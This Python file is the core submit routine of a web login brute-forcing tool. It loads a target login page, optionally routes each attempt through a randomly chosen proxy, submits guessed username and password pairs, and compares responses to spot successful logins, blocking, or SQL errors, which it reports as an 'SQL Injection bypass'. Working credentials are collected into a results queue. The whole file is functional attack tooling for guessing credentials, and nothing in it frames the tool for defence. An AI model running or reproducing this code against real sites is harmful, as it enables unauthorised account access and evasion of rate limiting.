from utils import events
from cores.actions import list_choose_randomly
from cores.check import find_login_form
from cores.analysis import check_sqlerror, get_redirection


def submit(options, login_field, tryCred, result):
	password, username = tryCred
	
	if username in [x[1] for x in list(result.queue)]:
		return True
	
	from cores.browser import Browser
	isLoginSuccess = "False"
	try:
		proc = Browser()
		if options.proxy:
			# Set proxy connect
			proxy_address = list_choose_randomly(options.proxy)
			proc.set_random_proxy(proxy_address)
		else:
			proxy_address = ""
		
		proc.open_url(options.url)
		_form = find_login_form(proc.forms())
		
		if not _form:
			options.block_text = proc.get_response() # TODO check if block text changes
			if options.verbose:
				isLoginSuccess = "blocked"
				events.error("Get blocked", "BRUTE")
			return False
		else:
			form_control, form_fields = _form

		if options.verbose and login_field != _form:
			events.info("Login form has been changed", "BRUTE")

		resp = proc.form_submit(form_control, form_fields, tryCred)
		
		from cores.analysis import get_response_diff
		text_changed, source_changed = get_response_diff(options.txt.decode('utf-8'), resp.content.decode('utf-8'))
		
		"""
			If there is no other login form, check all changes in response
			If there is no login request from all new urls -> successfully
			== > Behavior: Login fail, click here or windows.location = login_page
		"""
		isLoginForm = False
		
		if not find_login_form(proc.forms()):
			for new_urls in get_redirection(source_changed):
				if not new_urls.startswith("http") and not new_urls.endswith(options.exceptions()):
					try:
						from urllib.parse import urljoin
					except ImportError:
						from urlparse import urljoin
					new_urls = urljoin(options.url, new_urls)
					proc.open_url(new_urls)
					if find_login_form(proc.forms()):
						isLoginForm = True
						break

			if not isLoginForm:
				"""
					Check SQL Injection
					1. SQL Injection
					2. Login successfully: No SQLi + No Login form
				"""
				if check_sqlerror(proc.get_response()):
					isLoginSuccess = "SQLi"
				elif text_changed == source_changed and text_changed != options.block_text and options.block_text:
					pass
				else:
					if resp.status_code >= 400:
						isLoginSuccess = "error"
					else:
						isLoginSuccess = "True"
					# "If we tried login form with username+password field"
			else:
				pass
		# "Login form is still there. Oops"
		else:
			"""
				Possibly SQL injection or fail
			"""
			if check_sqlerror(proc.get_response()):
				isLoginSuccess = "SQLi"
			# else pass
		
		return True
	
	except Exception as error:
		"""
			Sometimes, web servers return error code because of bad configurations,
			but our cred is true.
			This code block showing information, for special cases
		"""
		isLoginSuccess = "exception"
		events.error("%s" % (error), "BRUTE")
	
	finally:
		if isLoginSuccess == "SQLi":
			events.success("SQL Injection bypass", "BRUTE")
			events.info("['%s': '%s']" % (username, password))
		elif isLoginSuccess == "error" and options.verbose:
			if username:
				events.error("['%s':'%s'] <--> %s" % (username, password, proxy_address), "%s" % (resp.status_code))
			else:
				events.error("[%s] <--> %s" % (password, proxy_address), "%s" % (resp.status_code))
		elif isLoginSuccess == "True":
			if username:
				events.found(username, password, proc.get_title())
				result.put([options.url, username, password])
			else:
				events.found('', password, proc.get_title())
				result.put([options.url, username, password])
		elif isLoginSuccess == "False" and options.verbose:
			if username:
				events.fail("['%s':'%s'] <==> %s" % (username, password, proxy_address), text_changed, proc.get_title())
			else:
				events.fail("['%s'] <==> %s" % (password, proxy_address), text_changed, proc.get_title())
		proc.close()